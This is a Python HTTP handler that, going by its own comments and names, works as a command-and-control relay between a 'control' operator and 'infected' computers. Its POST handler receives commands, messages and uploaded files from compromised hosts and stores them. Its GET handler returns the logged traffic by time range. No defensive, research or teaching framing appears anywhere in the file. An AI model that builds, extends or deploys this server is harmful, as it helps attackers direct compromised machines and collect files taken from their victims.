from http.server import BaseHTTPRequestHandler
import json
import os
import time
from urllib.parse import parse_qs
from datetime import datetime

# Folder to store logs
LOG_FOLDER = './logs'

# Log filenames for infected computers and control
LOG_FILES = {
    'infected_1': 'infected_1.log',
    'infected_2': 'infected_2.log',
    'control': 'control.log'
}

# Ensure log folder exists
if not os.path.exists(LOG_FOLDER):
    os.makedirs(LOG_FOLDER)

def write_log(log_file, message):
    """Writes a log message to the specified log file with a timestamp."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(os.path.join(LOG_FOLDER, log_file), 'a') as f:
        f.write(f"{timestamp} - {message}\n")

def read_logs(log_file, start_time=None, end_time=None):
    """Reads the logs from the specified file within a time range."""
    log_entries = []
    try:
        with open(os.path.join(LOG_FOLDER, log_file), 'r') as f:
            for line in f:
                timestamp_str, log_message = line.split(' - ', 1)
                log_timestamp = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S')
                
                if start_time and log_timestamp < start_time:
                    continue
                if end_time and log_timestamp > end_time:
                    break
                
                log_entries.append(line.strip())
    except FileNotFoundError:
        log_entries = ["No logs found."]
    
    return log_entries

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Handles log retrieval based on time periods."""
        try:
            query = parse_qs(self.path[1:])
            target = query.get('target', [''])[0]  # Which log to retrieve
            start_time_str = query.get('start', [''])[0]
            end_time_str = query.get('end', [''])[0]
            
            if target not in LOG_FILES:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Invalid target specified.")
                return
            
            # Parse time periods if provided
            start_time = datetime.strptime(start_time_str, '%Y-%m-%d %H:%M:%S') if start_time_str else None
            end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M:%S') if end_time_str else None
            
            logs = read_logs(LOG_FILES[target], start_time, end_time)
            
            # Return logs as JSON
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(logs).encode())
        
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error occurred while retrieving logs.")
    
    def do_POST(self):
        """Handles receiving and relaying messages, files, and commands."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        data = json.loads(post_data)
        
        # Check for the required fields in the POST data
        sender = data.get('sender')
        receiver = data.get('receiver')
        message = data.get('message')
        file_content = data.get('file')  # Base64 encoded or binary

        if not sender or not receiver or not message:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing required fields (sender, receiver, message).")
            return

        try:
            # Log the communication
            if sender == 'control':
                write_log(LOG_FILES['control'], f"Sent to {receiver}: {message}")
            else:
                write_log(LOG_FILES[f'infected_{sender}'], f"Sent to {receiver}: {message}")
            
            # Store the file if present
            if file_content:
                file_name = f"{sender}_to_{receiver}_{int(time.time())}.bin"
                with open(os.path.join(LOG_FOLDER, file_name), 'wb') as f:
                    f.write(file_content.encode())  # Assuming file_content is base64 or binary string
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = {'status': 'Message relayed successfully.'}
            self.wfile.write(json.dumps(response).encode())
        
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error occurred while relaying message.")

if __name__ == "__main__":
    print("Server is running. Ready to relay commands and messages.")
